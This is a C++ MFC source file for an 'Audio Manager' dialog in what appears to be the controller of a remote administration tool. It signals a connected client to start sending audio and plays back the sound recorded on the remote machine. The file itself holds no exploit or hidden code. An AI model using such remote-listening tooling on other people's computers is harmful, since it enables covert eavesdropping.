// AudioManager.cpp : implementation file
//

#include "stdafx.h"
#include "Server.h"
#include "Common.h"
#include "AudioManagerDlg.h"
#include "afxdialogex.h"


// CAudioManager dialog

IMPLEMENT_DYNAMIC(CAudioManagerDlg, CDialogEx)

CAudioManagerDlg::CAudioManagerDlg(CWnd* pParent, CIOCPServer* IOCPServer, PCONTEXT_OBJECT ContextObject)
	: CDialogEx(IDD_DIALOG_AUDIO_MANAGER, pParent)
{
	_M_IOCPServer    = IOCPServer;
	_M_ContextObject = ContextObject;
	_M_IconHwnd = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDR_MAINFRAME));
}

CAudioManagerDlg::~CAudioManagerDlg()
{
}

void CAudioManagerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

void CAudioManagerDlg::OnRecvComplete(void)
{
	if (_M_ContextObject == NULL)
	{

		return;
	}
	switch (_M_ContextObject->_M_InDeCompressedBufferData.GetArray()[0])
	{
	case CLIENT_AUDIO_MANAGER_REPLY:
	{
		
		break;
	}
	case CLIENT_AUDIO_RECORD_DATA:
	{
		_M_Audio.PlayBuffer(
						_M_ContextObject->_M_InDeCompressedBufferData.GetArray(1),
						_M_ContextObject->_M_InDeCompressedBufferData.GetArrayLength() - 1
					);
		break;
	}
	default:
	{
		break;
	}
	}
	return;

}

BEGIN_MESSAGE_MAP(CAudioManagerDlg, CDialogEx)
	ON_WM_CLOSE()
END_MESSAGE_MAP()


// CAudioManager message handlers


BOOL CAudioManagerDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	SetIcon(_M_IconHwnd, FALSE);

	CString v1;
	sockaddr_in ClientAddr;
	ZeroMemory(&ClientAddr, sizeof(sockaddr_in));

	int ClientLength = sizeof(ClientAddr);
	BOOL rVal = INVALID_SOCKET;
	if (_M_ContextObject != NULL)
	{
		rVal = getpeername(_M_ContextObject->ClientSocket, (sockaddr*)&ClientAddr, &ClientLength);
	}
	v1.Format(_T("\\%s - Audio Manager"), rVal != INVALID_SOCKET ? inet_ntoa(ClientAddr.sin_addr) : _T("Local Host"));

	SetWindowText(v1);

	BYTE IsToken = CLIENT_GO_ON;
	_M_IOCPServer->OnClientPreSend(_M_ContextObject, &IsToken, sizeof(BYTE));

	UpdateData(FALSE);

	return TRUE;  
}


void CAudioManagerDlg::OnClose()
{
	if (_M_ContextObject != NULL)
	{
		_M_ContextObject->DlgId = 0;
		_M_ContextObject->DlgHandle = NULL;
		CancelIo((HANDLE)_M_ContextObject->ClientSocket);
		closesocket(_M_ContextObject->ClientSocket);
	}

	CDialogEx::OnClose();
	return;
}


